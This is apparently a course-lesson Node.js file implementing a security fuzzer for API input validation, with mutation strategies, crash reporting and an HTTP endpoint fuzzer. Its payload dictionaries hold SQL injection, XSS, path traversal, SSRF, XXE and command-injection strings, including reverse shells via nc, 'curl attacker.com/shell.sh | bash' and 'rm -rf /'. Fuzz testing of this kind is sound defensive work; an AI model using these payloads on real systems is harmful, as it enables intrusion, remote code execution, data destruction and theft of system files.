/**
 * Security Fuzzing Framework
 * ===========================
 * Course: GitHub Copilot for Cybersecurity Specialists
 * Lesson: 03 - Automated Security Testing
 *
 * Copilot Prompt Used:
 * "Create fuzzing test harness for API input validation"
 *
 * Features:
 * - Mutation-based fuzzing
 * - Dictionary-based fuzzing
 * - Coverage-guided fuzzing simulation
 * - Crash detection and reporting
 */

const crypto = require('crypto');
const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

// =============================================================================
// Fuzzing Configuration
// =============================================================================

const config = {
  maxIterations: 10000,
  timeout: 5000,
  corpusDir: './corpus',
  crashDir: './crashes',
  coverageDir: './coverage'
};

// =============================================================================
// Mutation Strategies
// =============================================================================

const mutations = {
  /**
   * Bit flip mutation
   */
  bitFlip(buffer) {
    const copy = Buffer.from(buffer);
    const pos = Math.floor(Math.random() * copy.length);
    const bit = 1 << Math.floor(Math.random() * 8);
    copy[pos] ^= bit;
    return copy;
  },

  /**
   * Byte replacement
   */
  byteReplace(buffer) {
    const copy = Buffer.from(buffer);
    const pos = Math.floor(Math.random() * copy.length);
    copy[pos] = Math.floor(Math.random() * 256);
    return copy;
  },

  /**
   * Insert random bytes
   */
  insertBytes(buffer) {
    const pos = Math.floor(Math.random() * buffer.length);
    const insertLen = Math.floor(Math.random() * 10) + 1;
    const insert = crypto.randomBytes(insertLen);
    return Buffer.concat([
      buffer.subarray(0, pos),
      insert,
      buffer.subarray(pos)
    ]);
  },

  /**
   * Delete bytes
   */
  deleteBytes(buffer) {
    if (buffer.length < 2) return buffer;
    const pos = Math.floor(Math.random() * buffer.length);
    const deleteLen = Math.min(
      Math.floor(Math.random() * 10) + 1,
      buffer.length - pos
    );
    return Buffer.concat([
      buffer.subarray(0, pos),
      buffer.subarray(pos + deleteLen)
    ]);
  },

  /**
   * Duplicate section
   */
  duplicate(buffer) {
    const start = Math.floor(Math.random() * buffer.length);
    const len = Math.min(
      Math.floor(Math.random() * 20) + 1,
      buffer.length - start
    );
    const section = buffer.subarray(start, start + len);
    const insertPos = Math.floor(Math.random() * buffer.length);
    return Buffer.concat([
      buffer.subarray(0, insertPos),
      section,
      buffer.subarray(insertPos)
    ]);
  },

  /**
   * Cross-over with another input
   */
  crossover(buffer, corpus) {
    if (corpus.length < 2) return buffer;
    const other = corpus[Math.floor(Math.random() * corpus.length)];
    const pos1 = Math.floor(Math.random() * buffer.length);
    const pos2 = Math.floor(Math.random() * other.length);
    return Buffer.concat([
      buffer.subarray(0, pos1),
      other.subarray(pos2)
    ]);
  }
};

// =============================================================================
// Security-Focused Dictionaries
// =============================================================================

const dictionaries = {
  sqlInjection: [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "1; SELECT * FROM passwords",
    "' UNION SELECT * FROM users --",
    "admin'--",
    "1' AND 1=1--",
    "' OR 1=1#",
    "'; EXEC xp_cmdshell('dir'); --",
    "' AND SLEEP(5)--",
    "1' WAITFOR DELAY '0:0:5'--"
  ],

  xss: [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "'><script>alert(String.fromCharCode(88,83,83))</script>",
    "<iframe src='javascript:alert(1)'>",
    "<input onfocus=alert('XSS') autofocus>",
    "'-alert('XSS')-'",
    "</title><script>alert('XSS')</script>"
  ],

  commandInjection: [
    "; ls -la",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "; rm -rf /",
    "| nc attacker.com 4444 -e /bin/sh",
    "&& curl attacker.com/shell.sh | bash",
    "|| ping -c 10 attacker.com",
    "\n/bin/sh -i",
    "; python -c 'import socket,subprocess,os;s=socket.socket()'"
  ],

  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd%00.jpg",
    "....\\....\\....\\etc\\passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%255c..%255c..%255cetc/passwd",
    "file:///etc/passwd"
  ],

  bufferOverflow: [
    'A'.repeat(1000),
    'A'.repeat(10000),
    'A'.repeat(100000),
    '%n'.repeat(100),
    '%s'.repeat(100),
    String.fromCharCode(0).repeat(1000),
    '\x00'.repeat(500) + 'A'.repeat(500)
  ],

  formatString: [
    "%s%s%s%s%s%s%s%s%s%s",
    "%x%x%x%x%x%x%x%x%x%x",
    "%n%n%n%n%n%n%n%n%n%n",
    "%p%p%p%p%p%p%p%p%p%p",
    "AAAA%08x.%08x.%08x.%08x",
    "%d%d%d%d%d%d%d%d%d%d"
  ],

  ssrf: [
    "http://localhost/admin",
    "http://127.0.0.1:8080",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]/admin",
    "http://0.0.0.0:22",
    "file:///etc/passwd",
    "gopher://localhost:25/",
    "dict://localhost:11211/stat",
    "http://0177.0.0.1/",
    "http://2130706433/"
  ],

  ldapInjection: [
    "*",
    "*)(&",
    "*))%00",
    "admin)(&)",
    ")(cn=*))\x00",
    "*)(uid=*))(|(uid=*"
  ],

  xmlInjection: [
    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
    "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/'>]><foo>&xxe;</foo>",
    "<![CDATA[<script>alert('XSS')</script>]]>",
    "<!--#exec cmd='ls'-->",
    "<foo xmlns:xi='http://www.w3.org/2001/XInclude'><xi:include href='file:///etc/passwd'/></foo>"
  ]
};

// =============================================================================
// Fuzzer Class
// =============================================================================

class Fuzzer {
  constructor(options = {}) {
    this.options = { ...config, ...options };
    this.corpus = [];
    this.crashes = [];
    this.coverage = new Set();
    this.iterations = 0;
    this.startTime = null;
  }

  /**
   * Load initial corpus from directory
   */
  loadCorpus(dir = this.options.corpusDir) {
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
      return;
    }

    const files = fs.readdirSync(dir);
    for (const file of files) {
      const content = fs.readFileSync(path.join(dir, file));
      this.corpus.push(content);
    }

    console.log(`Loaded ${this.corpus.length} corpus entries`);
  }

  /**
   * Add to corpus if new coverage
   */
  addToCorpus(input, coverageId) {
    if (!this.coverage.has(coverageId)) {
      this.coverage.add(coverageId);
      this.corpus.push(input);

      // Save to disk
      const filename = crypto.randomBytes(8).toString('hex');
      fs.writeFileSync(
        path.join(this.options.corpusDir, filename),
        input
      );

      return true;
    }
    return false;
  }

  /**
   * Generate mutated input
   */
  mutate(input) {
    const strategies = Object.values(mutations);
    const strategy = strategies[Math.floor(Math.random() * strategies.length)];

    if (strategy === mutations.crossover) {
      return mutations.crossover(input, this.corpus);
    }

    return strategy(input);
  }

  /**
   * Generate dictionary-based input
   */
  generateFromDictionary(category = null) {
    const categories = Object.keys(dictionaries);
    const selectedCategory = category || categories[Math.floor(Math.random() * categories.length)];
    const words = dictionaries[selectedCategory];
    return Buffer.from(words[Math.floor(Math.random() * words.length)]);
  }

  /**
   * Save crash information
   */
  saveCrash(input, error, response) {
    if (!fs.existsSync(this.options.crashDir)) {
      fs.mkdirSync(this.options.crashDir, { recursive: true });
    }

    const crashId = crypto.randomBytes(8).toString('hex');
    const crashInfo = {
      id: crashId,
      timestamp: new Date().toISOString(),
      input: input.toString('base64'),
      inputHex: input.toString('hex'),
      inputUtf8: input.toString('utf8'),
      error: error ? error.message : null,
      response: response,
      iteration: this.iterations
    };

    fs.writeFileSync(
      path.join(this.options.crashDir, `crash_${crashId}.json`),
      JSON.stringify(crashInfo, null, 2)
    );

    this.crashes.push(crashInfo);
    console.log(`[!] Crash saved: crash_${crashId}.json`);

    return crashId;
  }

  /**
   * Run fuzzing against a function
   */
  async fuzzFunction(targetFn, options = {}) {
    const {
      maxIterations = this.options.maxIterations,
      seedInputs = [],
      dictionary = null
    } = options;

    console.log(`Starting fuzzing (${maxIterations} iterations)`);
    this.startTime = Date.now();

    // Initialize corpus with seeds
    for (const seed of seedInputs) {
      this.corpus.push(Buffer.from(seed));
    }

    if (this.corpus.length === 0) {
      this.corpus.push(Buffer.from('initial'));
    }

    for (this.iterations = 0; this.iterations < maxIterations; this.iterations++) {
      // Progress reporting
      if (this.iterations % 1000 === 0) {
        this.reportProgress();
      }

      // Generate input
      let input;
      if (Math.random() < 0.3 && dictionary) {
        input = this.generateFromDictionary(dictionary);
      } else {
        const baseInput = this.corpus[Math.floor(Math.random() * this.corpus.length)];
        input = this.mutate(baseInput);
      }

      // Run target function
      try {
        const result = await targetFn(input);

        // Check for interesting behavior
        if (result && result.isInteresting) {
          const coverageId = result.coverageId || crypto.createHash('md5').update(input).digest('hex');
          this.addToCorpus(input, coverageId);
        }

        // Check for security issues
        if (result && result.securityIssue) {
          this.saveCrash(input, null, result);
        }
      } catch (error) {
        // Crash detected
        this.saveCrash(input, error, null);
      }
    }

    this.reportFinalResults();
    return this.crashes;
  }

  /**
   * Run fuzzing against HTTP endpoint
   */
  async fuzzEndpoint(url, options = {}) {
    const {
      method = 'POST',
      headers = { 'Content-Type': 'application/json' },
      maxIterations = this.options.maxIterations,
      paramName = 'input',
      dictionary = null
    } = options;

    console.log(`Fuzzing endpoint: ${method} ${url}`);

    const targetFn = async (input) => {
      return new Promise((resolve, reject) => {
        const urlObj = new URL(url);
        const client = urlObj.protocol === 'https:' ? https : http;

        let body;
        if (headers['Content-Type'] === 'application/json') {
          body = JSON.stringify({ [paramName]: input.toString() });
        } else {
          body = input;
        }

        const req = client.request({
          hostname: urlObj.hostname,
          port: urlObj.port,
          path: urlObj.pathname + urlObj.search,
          method,
          headers: {
            ...headers,
            'Content-Length': Buffer.byteLength(body)
          },
          timeout: this.options.timeout
        }, (res) => {
          let data = '';
          res.on('data', chunk => data += chunk);
          res.on('end', () => {
            const result = {
              statusCode: res.statusCode,
              body: data,
              headers: res.headers
            };

            // Detect security issues
            if (res.statusCode === 500) {
              result.securityIssue = true;
              result.issueType = 'server_error';
            }

            // Check for error disclosure
            if (data.includes('stack trace') ||
                data.includes('SQL syntax') ||
                data.includes('at Object.')) {
              result.securityIssue = true;
              result.issueType = 'information_disclosure';
            }

            resolve(result);
          });
        });

        req.on('error', reject);
        req.on('timeout', () => {
          req.destroy();
          resolve({ timeout: true });
        });

        req.write(body);
        req.end();
      });
    };

    return this.fuzzFunction(targetFn, { maxIterations, dictionary });
  }

  /**
   * Report progress
   */
  reportProgress() {
    const elapsed = (Date.now() - this.startTime) / 1000;
    const rate = this.iterations / elapsed;

    console.log(
      `[${this.iterations}] ` +
      `corpus: ${this.corpus.length}, ` +
      `coverage: ${this.coverage.size}, ` +
      `crashes: ${this.crashes.length}, ` +
      `rate: ${rate.toFixed(0)}/s`
    );
  }

  /**
   * Report final results
   */
  reportFinalResults() {
    const elapsed = (Date.now() - this.startTime) / 1000;

    console.log('\n' + '='.repeat(50));
    console.log('FUZZING COMPLETE');
    console.log('='.repeat(50));
    console.log(`Iterations:   ${this.iterations}`);
    console.log(`Duration:     ${elapsed.toFixed(2)}s`);
    console.log(`Rate:         ${(this.iterations / elapsed).toFixed(0)} exec/s`);
    console.log(`Corpus size:  ${this.corpus.length}`);
    console.log(`Coverage:     ${this.coverage.size} unique paths`);
    console.log(`Crashes:      ${this.crashes.length}`);

    if (this.crashes.length > 0) {
      console.log('\nCrash summary:');
      for (const crash of this.crashes) {
        console.log(`  - ${crash.id}: ${crash.error || crash.response?.issueType}`);
      }
    }

    console.log('='.repeat(50));
  }
}

// =============================================================================
// Export
// =============================================================================

module.exports = {
  Fuzzer,
  mutations,
  dictionaries
};

// =============================================================================
// Demo
// =============================================================================

if (require.main === module) {
  console.log('=== Security Fuzzer Demo ===\n');

  const fuzzer = new Fuzzer({ maxIterations: 100 });

  // Example: Fuzz a vulnerable function
  const vulnerableParser = (input) => {
    const str = input.toString();

    // Simulated vulnerabilities
    if (str.includes("'")) {
      throw new Error('SQL syntax error near ' + str.substring(0, 50));
    }

    if (str.length > 10000) {
      throw new Error('Buffer overflow detected');
    }

    return { isInteresting: str.length > 100 };
  };

  fuzzer.fuzzFunction(vulnerableParser, {
    maxIterations: 100,
    seedInputs: ['test', 'hello world'],
    dictionary: 'sqlInjection'
  }).then(crashes => {
    console.log(`\nFound ${crashes.length} potential issues`);
  });
}
